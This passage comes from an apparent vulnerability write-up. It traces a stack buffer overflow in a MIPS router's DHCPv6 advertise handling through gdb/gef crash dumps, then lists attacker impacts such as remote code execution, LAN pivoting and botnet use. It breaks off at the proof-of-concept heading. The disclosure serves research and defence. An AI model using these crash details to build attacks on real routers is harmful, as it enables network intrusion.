</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t7<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r15    : <span style="color:#ae81ff">0x6e6f6974</span> (<span style="color:#960050;background-color:#1e0010">&#39;</span>tion<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">?</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r16    : <span style="color:#ae81ff">0x7fffe610</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x61616130</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">0</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0aaaaaaaaaaaaaa<span style="color:#960050;background-color:#1e0010">&#39;</span>...
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r17    : <span style="color:#ae81ff">0x7fffe9e8</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x0000000a</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s2<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r18    : <span style="color:#ae81ff">0x00000005</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s3<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r19    : <span style="color:#ae81ff">0x004018b1</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x0064f2f0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s4<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r20    : <span style="color:#ae81ff">0x77ffb000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s5<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r21    : <span style="color:#ae81ff">0x77ffb000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s6<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r22    : <span style="color:#ae81ff">0x77ffe518</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x77f5b000</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x464c457f</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s7<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r23    : <span style="color:#ae81ff">0x77fffd8c</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x00000001</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t8<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r24    : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t9<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r25    : <span style="color:#ae81ff">0x77f7d6fc</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x3c1c0008</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>k0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r26    : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>k1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r27    : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>gp<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r28    : <span style="color:#ae81ff">0x780052c0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>sp<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r29    : <span style="color:#ae81ff">0x7fffe110</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x00000007</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>fp<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>s8<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r30: <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>ra<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r31    : <span style="color:#ae81ff">0x004061cd</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x69922493</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>sr         : <span style="color:#ae81ff">0x0000a413</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>lo         : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>hi         : <span style="color:#ae81ff">0x00000003</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>bad        : <span style="color:#ae81ff">0x00430024</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x77ffe390</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>cause      : <span style="color:#ae81ff">0x10800024</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>fsr        : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>fir        : <span style="color:#ae81ff">0x00739300</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>pc         : <span style="color:#ae81ff">0x00419261</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x1a9a60b2</span>
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> 
</span></span><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> print <span style="color:#960050;background-color:#1e0010">$</span>a0
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7fffeb94</span>
</span></span><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> xinfo <span style="color:#960050;background-color:#1e0010">$</span>a0
</span></span><span style="display:flex;"><span><span style="color:#f92672">-------------------------------------</span> xinfo: <span style="color:#ae81ff">0x7fffeb94</span> <span style="color:#f92672">-------------------------------------</span>
</span></span><span style="display:flex;"><span>[ Legend:  Code <span style="color:#f92672">|</span> Heap <span style="color:#f92672">|</span> Stack <span style="color:#f92672">|</span> Writable <span style="color:#f92672">|</span> ReadOnly <span style="color:#f92672">|</span> None <span style="color:#f92672">|</span> RWX ]
</span></span><span style="display:flex;"><span>Start      End        Size       Offset     Perm Path
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x7ffde000</span> <span style="color:#ae81ff">0x7ffff000</span> <span style="color:#ae81ff">0x00021000</span> <span style="color:#ae81ff">0x00000000</span> rw<span style="color:#f92672">-</span> [stack]  <span style="color:#f92672">&lt;-</span>  <span style="color:#960050;background-color:#1e0010">$</span>v0, <span style="color:#960050;background-color:#1e0010">$</span>a0, <span style="color:#960050;background-color:#1e0010">$</span>a1, <span style="color:#960050;background-color:#1e0010">$</span>t2, <span style="color:#960050;background-color:#1e0010">$</span>s0, <span style="color:#960050;background-color:#1e0010">$</span>s1, <span style="color:#960050;background-color:#1e0010">$</span>sp
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Offset</span> (from mapped)<span style="color:#f92672">:</span>  <span style="color:#ae81ff">0x7ffde000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20b94</span>
</span></span></code></pre></div><p>The problem here is that the <code>memcpy</code> does the copy until the size to copy is <code>0</code> (we hit the end of payload or the <code>\x00</code> is explicitly specified in the payload). And since the destination buffer is on stack and has fixed length it will cause a stack overflow and we can overwrite some variables and pointers on stack. This is the vulnerability. Let&rsquo;s hit continue in gdb and see what happens. As expected, we have a segfault.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> c
</span></span><span style="display:flex;"><span>Continuing.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Program received signal SIGSEGV, Segmentation fault.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00402f0f</span> in <span style="color:#f92672">??</span> ()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[ Legend: Modified <span style="color:#66d9ef">register</span> <span style="color:#f92672">|</span> Code <span style="color:#f92672">|</span> Heap <span style="color:#f92672">|</span> Stack <span style="color:#f92672">|</span> Writable <span style="color:#f92672">|</span> ReadOnly <span style="color:#f92672">|</span> None <span style="color:#f92672">|</span> RWX <span style="color:#f92672">|</span> String ]
</span></span><span style="display:flex;"><span><span style="color:#f92672">---------------------------------------------------------------------------------------------------------------------</span> registers <span style="color:#f92672">----</span>
</span></span><span style="display:flex;"><span>warning: GDB can<span style="color:#960050;background-color:#1e0010">&#39;</span>t find the start of the function at <span style="color:#ae81ff">0x402f0f</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    GDB is unable to find the start of the function at <span style="color:#ae81ff">0x402f0f</span>
</span></span><span style="display:flex;"><span>and thus can<span style="color:#960050;background-color:#1e0010">&#39;</span>t determine the size of that function<span style="color:#960050;background-color:#1e0010">&#39;</span>s stack frame.
</span></span><span style="display:flex;"><span>This means that GDB may be unable to access that stack frame, or
</span></span><span style="display:flex;"><span>the frames below it.
</span></span><span style="display:flex;"><span>    This problem is most likely caused by an invalid program counter or
</span></span><span style="display:flex;"><span>stack pointer.
</span></span><span style="display:flex;"><span>    However, <span style="color:#66d9ef">if</span> you think GDB should simply search farther back
</span></span><span style="display:flex;"><span>from <span style="color:#ae81ff">0x402f0f</span> <span style="color:#66d9ef">for</span> code which looks like the beginning of a
</span></span><span style="display:flex;"><span>function, you can increase the range of the search using the <span style="color:#960050;background-color:#1e0010">`</span>set
</span></span><span style="display:flex;"><span>heuristic<span style="color:#f92672">-</span>fence<span style="color:#f92672">-</span>post<span style="color:#960050;background-color:#1e0010">&#39;</span> command.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>zero<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r0   : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>at<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r1     : <span style="color:#ae81ff">0x7fffe7fa</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x000477e2</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>v0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r2     : <span style="color:#ae81ff">0x0090f3e9</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>v1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r3     : <span style="color:#ae81ff">0x61616161</span> (<span style="color:#960050;background-color:#1e0010">&#39;</span>aaaa<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">?</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>a0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r4     : <span style="color:#ae81ff">0xe9f39002</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>a1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r5     : <span style="color:#ae81ff">0x7fffe7f9</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x0477e261</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>a2<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r6     : <span style="color:#ae81ff">0x00000001</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>a3<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r7     : <span style="color:#ae81ff">0x00000010</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r8     : <span style="color:#ae81ff">0x00000001</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r9     : <span style="color:#ae81ff">0x0000000d</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t2<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r10    : <span style="color:#ae81ff">0x7fffec8c</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x61616161</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t3<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r11    : <span style="color:#ae81ff">0x61000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t4<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r12    : <span style="color:#ae81ff">0x87e91de4</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t5<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r13    : <span style="color:#ae81ff">0x780052c0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t6<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r14    : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t7<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r15    : <span style="color:#ae81ff">0x6e6f6974</span> (<span style="color:#960050;background-color:#1e0010">&#39;</span>tion<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">?</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r16    : <span style="color:#ae81ff">0x00413070</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x65766461</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>advertise<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r17    : <span style="color:#ae81ff">0x7fffe5e8</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0xe9f39002</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s2<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r18    : <span style="color:#ae81ff">0x00000005</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s3<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r19    : <span style="color:#ae81ff">0x004018b1</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x0064f2f0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s4<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r20    : <span style="color:#ae81ff">0x77ffb000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s5<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r21    : <span style="color:#ae81ff">0x77ffb000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s6<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r22    : <span style="color:#ae81ff">0x77ffe518</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x77f5b000</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x464c457f</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>s7<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r23    : <span style="color:#ae81ff">0x77fffd8c</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x00000001</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t8<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r24    : <span style="color:#ae81ff">0x0042a0d0</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x77faf6f0</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x7c0410a0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>t9<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r25    : <span style="color:#ae81ff">0x77faf6f0</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x7c0410a0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>k0<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r26    : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>k1<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r27    : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>gp<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r28    : <span style="color:#ae81ff">0x780052c0</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>sp<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r29    : <span style="color:#ae81ff">0x7fffe1c8</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x7fffe5ec</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x0e000200</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>fp<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>s8<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r30: <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>ra<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">$</span>r31    : <span style="color:#ae81ff">0x00402f05</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x6cb304f6</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>sr         : <span style="color:#ae81ff">0x0000a413</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>lo         : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>hi         : <span style="color:#ae81ff">0x00000006</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>bad        : <span style="color:#ae81ff">0x61616169</span> (<span style="color:#960050;background-color:#1e0010">&#39;</span>iaaa<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">?</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>cause      : <span style="color:#ae81ff">0x10800010</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>fsr        : <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>fir        : <span style="color:#ae81ff">0x00739300</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>pc         : <span style="color:#ae81ff">0x00402f0f</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x6e202e9b</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">-------------------------------------------------------------------------------------------------------------------------</span> stack <span style="color:#f92672">----</span>
</span></span><span style="display:flex;"><span>   <span style="color:#960050;background-color:#1e0010">$</span>sp  <span style="color:#ae81ff">0x7fffe1c8</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">0x0000</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">000</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x7fffe5ec</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x0e000200</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x7fffe1cc</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">0x0004</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">001</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x7fffe7fa</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x000477e2</span>  <span style="color:#f92672">&lt;-</span>  <span style="color:#960050;background-color:#1e0010">$</span>at
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x7fffe1d0</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">0x0008</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">002</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x004124cc</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x65636572</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>receive <span style="color:#f92672">%</span>s from <span style="color:#f92672">%</span>s on <span style="color:#f92672">%</span>s<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x7fffe1d4</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">0x000c</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">003</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x00413070</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x65766461</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>advertise<span style="color:#960050;background-color:#1e0010">&#39;</span>  <span style="color:#f92672">&lt;-</span>  <span style="color:#960050;background-color:#1e0010">$</span>s0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x7fffe1d8</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">0x0010</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">004</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x0042ad62</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x30386566</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>fe80<span style="color:#f92672">::</span><span style="color:#ae81ff">542</span>b:<span style="color:#ae81ff">76</span>ce:<span style="color:#ae81ff">631</span>b:<span style="color:#ae81ff">36</span>ce<span style="color:#f92672">%</span>eth0<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x7fffe1dc</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">0x0014</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">005</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x0042bfc0</span>  <span style="color:#f92672">-&gt;</span>  <span style="color:#ae81ff">0x30687465</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>eth0<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x7fffe1e0</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">0x0018</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">006</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x7fffe1e4</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">0x001c</span><span style="color:#f92672">|+</span><span style="color:#ae81ff">007</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x00000000</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">------------------------------------------------------------------------------------------------------------------</span> code:mips:<span style="color:#ae81ff">32</span> <span style="color:#f92672">----</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x402f03</span> <span style="color:#ae81ff">6580</span>                <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>   nop     
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x402f05</span> f604b36c            <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>   lw     v1, <span style="color:#ae81ff">0x403588</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x402f09</span> ea81                <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>   and    v0, v1 
</span></span><span style="display:flex;"><span> <span style="color:#f92672">-&gt;</span> <span style="color:#ae81ff">0x402f0f</span> <span style="color:#ae81ff">9</span>b2e                <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>   lw     s0, <span style="color:#ae81ff">8</span> (v1) 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x402f11</span> <span style="color:#ae81ff">206</span>e                <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>   beqz   s0, <span style="color:#ae81ff">0x402f6f</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x402f13</span> <span style="color:#ae81ff">986</span>a                <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>   lw     v1, <span style="color:#ae81ff">56</span> (s0) 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x402f15</span> ea30                <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>   cmp    v0, v1 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x402f17</span> <span style="color:#ae81ff">6000</span>                <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>   bteqz  <span style="color:#ae81ff">0x402f79</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x402f19</span> <span style="color:#ae81ff">98f</span>a                <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>   lw     s0, <span style="color:#ae81ff">0</span> (s0) 
</span></span><span style="display:flex;"><span><span style="color:#f92672">-----------------------------------------------------------------------------------------------------------------------</span> threads <span style="color:#f92672">----</span>
</span></span><span style="display:flex;"><span>[Thread Id:<span style="color:#ae81ff">1</span>, tid:<span style="color:#ae81ff">3103</span>] stopped at <span style="color:#ae81ff">0x00402f0f</span> <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>, reason: SIGSEGV
</span></span><span style="display:flex;"><span><span style="color:#f92672">-------------------------------------------------------------------------------------------------------------------------</span> trace <span style="color:#f92672">----</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">-&gt;</span> [<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0</span>] <span style="color:#ae81ff">0x00402f0f</span> <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">---------------------------------</span>
</span></span></code></pre></div><p>The program crashes when trying to execute <code>lw s0, 8(v1)</code>. When looking at <code>v1</code>, we can see that it has been overwritten with <code>aaaa</code>. And the loading of that invalid address causes the crash.
Now we have a crash we are pretty sure that there is a buffer overflow vulnerability in this function.</p>
<h3 id="impact">Impact<a href="#impact" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
      stroke-linecap="round" stroke-linejoin="round">
      <path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path>
      <line x1="8" y1="12" x2="16" y2="12"></line>
   </svg></a></h3>
<p>This vulnerability creates a critical security exposure at a network infrastructure level, potentially allowing attackers to:</p>
<ul>
<li>Gain a Remote code execution on the router</li>
<li>Pivot into the LAN network</li>
<li>Intercept, modify, or redirect network communications</li>
<li>Establish persistence within the network infrastructure</li>
<li>Access internal network segments from external positions (as the vulnerability is triggered when attempts to get an IPv6 address from DHCP server i.e it is triggered from WAN side)</li>
<li>Use the router in botnet network</li>
<li>etc&hellip;</li>
</ul>
<h2 id="exploitation-path--proof-of-concept-poc">Exploitation Path / Proof of Concept (PoC)<a href="#exploitation-path--proof-of-concept-poc" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
